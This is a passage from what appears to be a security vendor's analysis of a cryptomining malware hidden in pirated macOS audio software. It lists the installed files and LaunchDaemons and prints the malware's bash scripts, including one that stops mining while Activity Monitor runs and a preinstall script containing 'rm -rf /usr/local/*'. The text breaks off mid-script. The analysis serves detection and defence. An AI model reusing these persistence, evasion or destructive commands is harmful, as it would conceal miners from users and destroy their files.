<div id="attachment_127061" style="width: 760px" class="wp-caption aligncenter"><a href="/wp-content/uploads/2019/06/Figure-6-1.png"><img class="wp-image-127061" src="/wp-content/uploads/2019/06/Figure-6-1.png" alt="" width="750" height="271" srcset="https://www.welivesecurity.com/wp-content/uploads/2019/06/Figure-6-1.png 691w, https://www.welivesecurity.com/wp-content/uploads/2019/06/Figure-6-1-300x109.png 300w" sizes="(max-width: 750px) 100vw, 750px" /></a><p class="wp-caption-text"><i>Figure 6. <span style="font-family: courier new, courier, monospace;">Polyverse.Music.Manipulator.v1.0.1.macOS.dmg</span></i><i> setup instructions</i></p></div>
<h3>Version 1</h3>
<p>The miner files in the downloaded application package are not obfuscated in any way or placed in another package; they are installed alongside the software in the following places:</p>
<ul>
<li><span style="font-family: courier new, courier, monospace;">/Library/Application Support/.Qemusys</span>
<ul>
<li><span style="font-family: courier new, courier, monospace;">qemu-system-x86_64</span> – clean QEMU binary</li>
<li><span style="font-family: courier new, courier, monospace;">sys00_1-disk001.qcow2</span> – Linux image (first)</li>
<li><span style="font-family: courier new, courier, monospace;">qemuservice</span> – shell script that launches the first image via the <span style="font-family: courier new, courier, monospace;">qemu-system-x86_64</span> binary (see Script 1 listing)</li>
</ul>
</li>
<li><span style="font-family: courier new, courier, monospace;">/Library/Application Support/.System-Monitor</span>
<ul>
<li><span style="font-family: courier new, courier, monospace;">system-monitor.daemon</span> – launches first image via <span style="font-family: courier new, courier, monospace;">system-monitor</span> binary</li>
</ul>
</li>
<li><span style="font-family: courier new, courier, monospace;">/usr/local/bin</span>
<ul>
<li><span style="font-family: courier new, courier, monospace;">.Tools-Service</span>
<ul>
<li><span style="font-family: courier new, courier, monospace;">sys00_1-disk001.qcow2</span> – Linux image (second)</li>
<li><span style="font-family: courier new, courier, monospace;">tools-service.daemon</span> – launches second image via<span style="font-family: courier new, courier, monospace;"> tools-service</span> binary</li>
</ul>
</li>
<li><span style="font-family: courier new, courier, monospace;">cpumonitor</span> – starts/stops mining based on idle time and CPU usage</li>
<li><span style="font-family: courier new, courier, monospace;">system-monitor</span> – copy of <span style="font-family: courier new, courier, monospace;">qemu-system-x86_64</span> binary</li>
<li><span style="font-family: courier new, courier, monospace;">tools-service</span> – copy of<span style="font-family: courier new, courier, monospace;"> qemu-system-x86_64</span> binary</li>
</ul>
</li>
<li><span style="font-family: courier new, courier, monospace;">/Library/LaunchDaemons</span>
<ul>
<li><span style="font-family: courier new, courier, monospace;">buildtools.system-monitor.plist</span> – launches <span style="font-family: courier new, courier, monospace;">system-monitor.daemon</span></li>
<li><span style="font-family: courier new, courier, monospace;">buildtools.tools-service.plist</span> – launches <span style="font-family: courier new, courier, monospace;">tools-service.daemon</span></li>
<li><span style="font-family: courier new, courier, monospace;">modulesys.qemuservice.plist</span> – launches <span style="font-family: courier new, courier, monospace;">qemuservice</span></li>
<li><span style="font-family: courier new, courier, monospace;">systools.cpumonitor.plist</span> – launches <span style="font-family: courier new, courier, monospace;">cpumonitor</span></li>
</ul>
</li>
</ul>
<p></p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9a94431f51427676339" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
#!/bin/bash
function start {
pgrep "Activity Monitor"
if [ $? -eq 0 ]; then
launchctl unload -w /Library/LaunchDaemons/com.modulesys.qemuservice.plist
else
/usr/local/bin/qemu-system-x86_64 -M accel=hvf --cpu host /Library/Application\ Support/.Qemusys/sys00_1-disk001.qcow2 -display none
fi
}
start;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9a94431f51427676339-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9a94431f51427676339-2">2</div><div class="crayon-num" data-line="crayon-60a9a94431f51427676339-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9a94431f51427676339-4">4</div><div class="crayon-num" data-line="crayon-60a9a94431f51427676339-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9a94431f51427676339-6">6</div><div class="crayon-num" data-line="crayon-60a9a94431f51427676339-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9a94431f51427676339-8">8</div><div class="crayon-num" data-line="crayon-60a9a94431f51427676339-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9a94431f51427676339-10">10</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9a94431f51427676339-1"><span class="crayon-p">#!/bin/bash</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9a94431f51427676339-2"><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">start</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-60a9a94431f51427676339-3"><span class="crayon-i">pgrep</span><span class="crayon-h"> </span><span class="crayon-s">"Activity Monitor"</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9a94431f51427676339-4"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-sy">?</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">eq</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-h"> </span><span class="crayon-sy">]</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-st">then</span></div><div class="crayon-line" id="crayon-60a9a94431f51427676339-5"><span class="crayon-e">launchctl </span><span class="crayon-v">unload</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">w</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">Library</span><span class="crayon-o">/</span><span class="crayon-v">LaunchDaemons</span><span class="crayon-o">/</span><span class="crayon-v">com</span><span class="crayon-sy">.</span><span class="crayon-v">modulesys</span><span class="crayon-sy">.</span><span class="crayon-v">qemuservice</span><span class="crayon-sy">.</span><span class="crayon-e">plist</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9a94431f51427676339-6"><span class="crayon-st">else</span></div><div class="crayon-line" id="crayon-60a9a94431f51427676339-7"><span class="crayon-o">/</span><span class="crayon-v">usr</span><span class="crayon-o">/</span><span class="crayon-v">local</span><span class="crayon-o">/</span><span class="crayon-v">bin</span><span class="crayon-o">/</span><span class="crayon-v">qemu</span><span class="crayon-o">-</span><span class="crayon-v">system</span><span class="crayon-o">-</span><span class="crayon-v">x86_64</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">M</span><span class="crayon-h"> </span><span class="crayon-v">accel</span><span class="crayon-o">=</span><span class="crayon-v">hvf</span><span class="crayon-h"> </span><span class="crayon-o">--</span><span class="crayon-e">cpu </span><span class="crayon-v">host</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">Library</span><span class="crayon-o">/</span><span class="crayon-v">Application</span><span class="crayon-sy">\</span><span class="crayon-h"> </span><span class="crayon-v">Support</span><span class="crayon-o">/</span><span class="crayon-sy">.</span><span class="crayon-v">Qemusys</span><span class="crayon-o">/</span><span class="crayon-v">sys00_1</span><span class="crayon-o">-</span><span class="crayon-v">disk001</span><span class="crayon-sy">.</span><span class="crayon-v">qcow2</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-e">display </span><span class="crayon-e">none</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9a94431f51427676339-8"><span class="crayon-i">fi</span></div><div class="crayon-line" id="crayon-60a9a94431f51427676339-9"><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9a94431f51427676339-10"><span class="crayon-v">start</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0002 seconds] -->
<p><em>Script 1. <span style="font-family: courier new, courier, monospace;">qemuservice</span> shell script</em></p>
<p>After the dependencies are copied over, all miner-related daemons are launched and then the actual software is installed:</p>
<ul>
<li><span style="font-family: courier new, courier, monospace;">qemuservice</span> won’t launch the image if the <span style="font-family: courier new, courier, monospace;">Activity Monitor</span> process is running. In fact, if it is running, it will unload the plist that it was launched by.</li>
<li><span style="font-family: courier new, courier, monospace;">tools-service.daemon</span> will launch the image only when<span style="font-family: courier new, courier, monospace;"> qemu-system-x86_64</span> process is not running and after sleeping for 45 minutes.</li>
<li><span style="font-family: courier new, courier, monospace;">System-monitor.daemon</span> will launch the image only if Intel i5, i7 or i9 CPU is detected.</li>
</ul>
<p>These scripts use the same command to launch the QEMU image, only differing in names and the image path.</p>
<p>We’ve found the following screenshot related to version 1 of the miner:</p>
<div id="attachment_127021" style="width: 327px" class="wp-caption aligncenter"><a href="/wp-content/uploads/2019/06/Figure-7-Wm.png"><img class="wp-image-127021 size-full" src="/wp-content/uploads/2019/06/Figure-7-Wm.png" alt="" width="317" height="140" srcset="https://www.welivesecurity.com/wp-content/uploads/2019/06/Figure-7-Wm.png 317w, https://www.welivesecurity.com/wp-content/uploads/2019/06/Figure-7-Wm-300x132.png 300w" sizes="(max-width: 317px) 100vw, 317px" /></a><p class="wp-caption-text"><i>Figure 7. CPU consumption of QEMU with Little Snitch (source: https://imgur.com/a/sc3u6kk)</i></p></div>
<p>It is from Little Snitch indicating that some connections from the process <span style="font-family: courier new, courier, monospace;">qemu-system-x86_64</span> were blocked. Specifically, <em>hopto[.]org</em> (a free hostname service) is a C&amp;C used by version 1 of the miner.</p>
<h3>Version 2</h3>
<p>Miner files are in <span style="font-family: courier new, courier, monospace;">data_installer.pkg</span> inside the downloaded application package. <span style="font-family: courier new, courier, monospace;">data_installer.pkg</span> is installed first, then the VST software. Before installation, version 1 of the miner is removed along with executing the command:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9a94431f53862364088" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
rm -rf /usr/local/*</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9a94431f53862364088-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9a94431f53862364088-1"><span class="crayon-v">rm</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">rf</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">usr</span><span class="crayon-o">/</span><span class="crayon-v">local</span><span class="crayon-o">/</span><span class="crayon-o">*</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0001 seconds] -->
<p>As seen in the listing in Script 2, it only does so when it detects a running <span style="font-family: courier new, courier, monospace;">qemu-system-x86_64</span> process.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9a94431f58008740662" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
#!/bin/bash
#Clear Old
function clear {
LGC=`ps aux |grep "qemu-system-x86_64" |wc -l`
if [ $LGC -ge 2 ]
Then
launchctl unload -w /Library/LaunchDaemons/com.modulesys.qemuservice.plist
launchctl unload -w /Library/LaunchDaemons/com.buildtools.tools-service.plist
launchctl unload -w /Library/LaunchDaemons/com.buildtools.system-monitor.plist
launchctl unload -w /Library/LaunchDaemons/com.systools.cpumonitor.plist
rm -f /Library/LaunchDaemons/com.buildtools.system-monitor.plist
rm -f /Library/LaunchDaemons/com.modulesys.qemuservice.plist
rm -f /Library/LaunchDaemons/com.buildtools.tools-service.plist
rm -f /Library/LaunchDaemons/com.systools.cpumonitor.plist
rm -rf /Library/Application\ Support/.Qemusys
rm -rf /usr/local/bin/.Tools-Service
rm -rf /Library/Application\ Support/.System-Monitor/ 
rm -rf /usr/local/*
fi
exit 0
}
clear;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9a94431f58008740662-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9a94431f58008740662-2">2</div><div class="crayon-num" data-line="crayon-60a9a94431f58008740662-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9a94431f58008740662-4">4</div><div class="crayon-num" data-line="crayon-60a9a94431f58008740662-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9a94431f58008740662-6">6</div><div class="crayon-num" data-line="crayon-60a9a94431f58008740662-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9a94431f58008740662-8">8</div><div class="crayon-num" data-line="crayon-60a9a94431f58008740662-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9a94431f58008740662-10">10</div><div class="crayon-num" data-line="crayon-60a9a94431f58008740662-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9a94431f58008740662-12">12</div><div class="crayon-num" data-line="crayon-60a9a94431f58008740662-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9a94431f58008740662-14">14</div><div class="crayon-num" data-line="crayon-60a9a94431f58008740662-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9a94431f58008740662-16">16</div><div class="crayon-num" data-line="crayon-60a9a94431f58008740662-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9a94431f58008740662-18">18</div><div class="crayon-num" data-line="crayon-60a9a94431f58008740662-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9a94431f58008740662-20">20</div><div class="crayon-num" data-line="crayon-60a9a94431f58008740662-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9a94431f58008740662-22">22</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9a94431f58008740662-1"><span class="crayon-p">#!/bin/bash</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9a94431f58008740662-2"><span class="crayon-p">#Clear Old</span></div><div class="crayon-line" id="crayon-60a9a94431f58008740662-3"><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">clear</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9a94431f58008740662-4"><span class="crayon-v">LGC</span><span class="crayon-o">=</span><span class="crayon-sy">`</span><span class="crayon-e">ps </span><span class="crayon-v">aux</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-i">grep</span><span class="crayon-h"> </span><span class="crayon-s">"qemu-system-x86_64"</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-v">wc</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">l</span><span class="crayon-sy">`</span></div><div class="crayon-line" id="crayon-60a9a94431f58008740662-5"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">LGC</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">ge</span><span class="crayon-h"> </span><span class="crayon-cn">2</span><span class="crayon-h"> </span><span class="crayon-sy">]</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9a94431f58008740662-6"><span class="crayon-st">Then</span></div><div class="crayon-line" id="crayon-60a9a94431f58008740662-7"><span class="crayon-e">launchctl </span><span class="crayon-v">unload</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">w</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">Library</span><span class="crayon-o">/</span><span class="crayon-v">LaunchDaemons</span><span class="crayon-o">/</span><span class="crayon-v">com</span><span class="crayon-sy">.</span><span class="crayon-v">modulesys</span><span class="crayon-sy">.</span><span class="crayon-v">qemuservice</span><span class="crayon-sy">.</span><span class="crayon-e">plist</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9a94431f58008740662-8"><span class="crayon-e">launchctl </span><span class="crayon-v">unload</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">w</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">Library</span><span class="crayon-o">/</span><span class="crayon-v">LaunchDaemons</span><span class="crayon-o">/</span><span class="crayon-v">com</span><span class="crayon-sy">.</span><span class="crayon-v">buildtools</span><span class="crayon-sy">.</span><span class="crayon-v">tools</span><span class="crayon-o">-</span><span class="crayon-v">service</span><span class="crayon-sy">.</span><span class="crayon-e">plist</span></div><div class="crayon-line" id="crayon-60a9a94431f58008740662-9"><span class="crayon-e">launchctl </span><span class="crayon-v">unload</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">w</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">Library</span><span class="crayon-o">/</span><span class="crayon-v">LaunchDaemons</span><span class="crayon-o">/</span><span class="crayon-v">com</span><span class="crayon-sy">.</span><span class="crayon-v">buildtools</span><span class="crayon-sy">.</span><span class="crayon-v">system</span><span class="crayon-o">-</span><span class="crayon-v">monitor</span><span class="crayon-sy">.</span><span class="crayon-e">plist</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9a94431f58008740662-10"><span class="crayon-e">launchctl </span><span class="crayon-v">unload</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">w</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">Library</span><span class="crayon-o">/</span><span class="crayon-v">LaunchDaemons</span><span class="crayon-o">/</span><span class="crayon-v">com</span><span class="crayon-sy">.</span><span class="crayon-v">systools</span><span class="crayon-sy">.</span><span class="crayon-v">cpumonitor</span><span class="crayon-sy">.</span><span class="crayon-e">plist</span></div><div class="crayon-line" id="crayon-60a9a94431f58008740662-11"><span class="crayon-v">rm</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">f</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">Library</span><span class="crayon-o">/</span><span class="crayon-v">LaunchDaemons</span><span class="crayon-o">/</span><span class="crayon-v">com</span><span class="crayon-sy">.</span><span class="crayon-v">buildtools</span><span class="crayon-sy">.</span><span class="crayon-v">system</span><span class="crayon-o">-</span><span class="crayon-v">monitor</span><span class="crayon-sy">.</span><span class="crayon-e">plist</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9a94431f58008740662-12"><span class="crayon-v">rm</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">f</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">Library</span><span class="crayon-o">/</span><span class="crayon-v">LaunchDaemons</span><span class="crayon-o">/</span><span class="crayon-v">com</span><span class="crayon-sy">.</span><span class="crayon-v">modulesys</span><span class="crayon-sy">.</span><span class="crayon-v">qemuservice</span><span class="crayon-sy">.</span><span class="crayon-e">plist</span></div><div class="crayon-line" id="crayon-60a9a94431f58008740662-13"><span class="crayon-v">rm</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">f</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">Library</span><span class="crayon-o">/</span><span class="crayon-v">LaunchDaemons</span><span class="crayon-o">/</span><span class="crayon-v">com</span><span class="crayon-sy">.</span><span class="crayon-v">buildtools</span><span class="crayon-sy">.</span><span class="crayon-v">tools</span><span class="crayon-o">-</span><span class="crayon-v">service</span><span class="crayon-sy">.</span><span class="crayon-e">plist</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9a94431f58008740662-14"><span class="crayon-v">rm</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">f</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">Library</span><span class="crayon-o">/</span><span class="crayon-v">LaunchDaemons</span><span class="crayon-o">/</span><span class="crayon-v">com</span><span class="crayon-sy">.</span><span class="crayon-v">systools</span><span class="crayon-sy">.</span><span class="crayon-v">cpumonitor</span><span class="crayon-sy">.</span><span class="crayon-e">plist</span></div><div class="crayon-line" id="crayon-60a9a94431f58008740662-15"><span class="crayon-v">rm</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">rf</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">Library</span><span class="crayon-o">/</span><span class="crayon-v">Application</span><span class="crayon-sy">\</span><span class="crayon-h"> </span><span class="crayon-v">Support</span><span class="crayon-o">/</span><span class="crayon-sy">.</span><span class="crayon-e">Qemusys</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9a94431f58008740662-16"><span class="crayon-v">rm</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">rf</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">usr</span><span class="crayon-o">/</span><span class="crayon-v">local</span><span class="crayon-o">/</span><span class="crayon-v">bin</span><span class="crayon-o">/</span><span class="crayon-sy">.</span><span class="crayon-v">Tools</span><span class="crayon-o">-</span><span class="crayon-e">Service</span></div><div class="crayon-line" id="crayon-60a9a94431f58008740662-17"><span class="crayon-v">rm</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">rf</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">Library</span><span class="crayon-o">/</span><span class="crayon-v">Application</span><span class="crayon-sy">\</span><span class="crayon-h"> </span><span class="crayon-v">Support</span><span class="crayon-o">/</span><span class="crayon-sy">.</span><span class="crayon-v">System</span><span class="crayon-o">-</span><span class="crayon-v">Monitor</span><span class="crayon-o">/</span><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9a94431f58008740662-18"><span class="crayon-v">rm</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">rf</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">usr</span><span class="crayon-o">/</span><span class="crayon-v">local</span><span class="crayon-o">/</span><span class="crayon-o">*</span></div><div class="crayon-line" id="crayon-60a9a94431f58008740662-19"><span class="crayon-e">fi</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9a94431f58008740662-20"><span class="crayon-i">exit</span><span class="crayon-h"> </span><span class="crayon-cn">0</span></div><div class="crayon-line" id="crayon-60a9a94431f58008740662-21"><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9a94431f58008740662-22"><span class="crayon-v">clear</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0006 seconds] -->
<p><em>Script 2. <span style="font-family: courier new, courier, monospace;">data_installer.pkg</span> preinstall script that removes version 1<br />
</em></p>
<p>The following temporary files are created:</p>
<ul>
<li><span style="font-family: courier new, courier, monospace;">/Users/Shared</span>
<ul>
<li><span style="font-family: courier new, courier, monospace;">z1</span> &#8211; QEMU binary</li>
<li><span style="font-family: courier new, courier, monospace;">z1.daemon</span> &#8211; launches the QEMU image with the QEMU binary</li>
<li><span style="font-family: courier new, courier, monospace;">z1.qcow2</span> &#8211; QEMU image</li>
<li><span style="font-family: courier new, courier, monospace;">z1.plist</span> &#8211; launches <span style="font-family: courier new, courier, monospace;">z1.daemon</span></li>
<li><span style="font-family: courier new, courier, monospace;">z3</span> – CPU monitor script, little change from version 1 <span style="font-family: courier new, courier, monospace;">cpumonitor</span></li>
<li><span style="font-family: courier new, courier, monospace;">z3.plist</span> &#8211; used to launch z3</li>
<li><span style="font-family: courier new, courier, monospace;">randwd</span> &#8211; generates random names</li>
</ul>
</li>
</ul>
<p>After dependencies are copied over, the miner is installed. This time the names of QEMU binaries, plists and directories are randomized with the <span style="font-family: courier new, courier, monospace;">randwd</span> script. The miner installation creates two copies of <span style="font-family: courier new, courier, monospace;">z1, z1.daemon, z1.qcow2 <span style="font-family: georgia, palatino, serif;">and</span> z1.plist</span>. For each copy, the following happens:</p>
<ul>
<li>A directory with a random name is created in <span style="font-family: courier new, courier, monospace;">/Library/Application Support</span></li>
<li>The QEMU binary <span style="font-family: courier new, courier, monospace;">z1</span> carries the same name as the directory and is copied into <span style="font-family: courier new, courier, monospace;">/usr/local/bin</span></li>
<li><span style="font-family: courier new, courier, monospace;">z1.daemon</span> (see listing in Script 3) and <span style="font-family: courier new, courier, monospace;">z1.qcow2</span> are copied into this directory under their random names</li>
<li><span style="font-family: courier new, courier, monospace;">z1.plist</span> is copied with the name <span style="font-family: courier new, courier, monospace;">com.&lt;random_name&gt;.plist</span> into <span style="font-family: courier new, courier, monospace;">/Library/LaunchDaemon<em>s</em></span></li>
</ul>
<p><span style="font-family: courier new, courier, monospace;">z1.daemon, z1.plist, z3 and z3.plist</span> files serve as templates. References to other scripts, binaries, plists, etc. in these files are replaced by their corresponding generated random name.</p>
<p>A random name is also chosen for the CPU monitor (<span style="font-family: courier new, courier, monospace;">z3</span>) shell script and its accompanying plist file. <span style="font-family: courier new, courier, monospace;">z3</span> is copied into <span style="font-family: courier new, courier, monospace;">/usr/local/bin</span> and the plist into <span style="font-family: courier new, courier, monospace;">/Library/LaunchDaemons</span> under the name <span style="font-family: courier new, courier, monospace;">com.&lt;random_name&gt;.plist</span>.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9a94431f5a690813014" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
#!/bin/bash
function start {
pgrep "Activity Monitor"
if [ $? -eq 0 ]; then
launchctl unload -w /Library/LaunchDaemons/com.AAAA.plist
else
/usr/local/bin/BBBB -M accel=hvf --cpu host /Library/Application\ Support/CCCC/DDDD -display none
fi
}
start;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9a94431f5a690813014-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9a94431f5a690813014-2">2</div><div class="crayon-num" data-line="crayon-60a9a94431f5a690813014-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9a94431f5a690813014-4">4</div><div class="crayon-num" data-line="crayon-60a9a94431f5a690813014-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9a94431f5a690813014-6">6</div><div class="crayon-num" data-line="crayon-60a9a94431f5a690813014-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9a94431f5a690813014-8">8</div><div class="crayon-num" data-line="crayon-60a9a94431f5a690813014-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9a94431f5a690813014-10">10</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9a94431f5a690813014-1"><span class="crayon-p">#!/bin/bash</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9a94431f5a690813014-2"><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">start</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-60a9a94431f5a690813014-3"><span class="crayon-i">pgrep</span><span class="crayon-h"> </span><span class="crayon-s">"Activity Monitor"</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9a94431f5a690813014-4"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-sy">?</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">eq</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-h"> </span><span class="crayon-sy">]</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span 